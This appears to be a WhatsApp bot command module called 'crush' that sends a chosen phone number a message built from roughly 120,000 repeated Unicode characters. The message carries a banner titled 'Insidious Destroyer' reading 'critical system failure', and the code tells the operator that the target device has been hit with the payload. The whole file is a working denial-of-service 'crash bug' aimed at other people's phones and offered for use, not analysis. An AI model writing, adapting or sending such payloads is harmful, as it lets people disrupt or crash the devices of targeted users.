module.exports = {
    name: "crush",
    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
        if (!isOwner) return;
        let target = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from;
        
        // 21. BUGS: HIGH-POWER UNICODE BUFFER
        const bugPayload = "ॵ".repeat(70000) + "ℛ".repeat(50000); 
        
        await conn.sendMessage(target, { 
            text: bugPayload,
            contextInfo: { 
                externalAdReply: { 
                    title: "🥀 ɪɴꜱɪᴅɪᴏᴜꜱ ᴅᴇꜱᴛʀᴏʏᴇʀ ᴠ2.1.1 🥀", 
                    body: "ᴄʀɪᴛɪᴄᴀʟ ꜱʏꜱᴛᴇᴍ ꜰᴀɪʟᴜʀᴇ", 
                    mediaType: 1,
                    thumbnail: await axios.get('https://files.catbox.moe/horror.jpg', { responseType: 'arraybuffer' }).then(res => res.data)
                } 
            } 
        });
        conn.sendMessage(from, { text: fancy("ᴅᴇᴠɪᴄᴇ ʜᴀꜱ ʙᴇᴇɴ ᴛᴀʀɢᴇᴛᴇᴅ ᴡɪᴛʜ ᴄʀᴜꜱʜ ᴘᴀʏʟᴏᴀᴅ.") });
    }
};
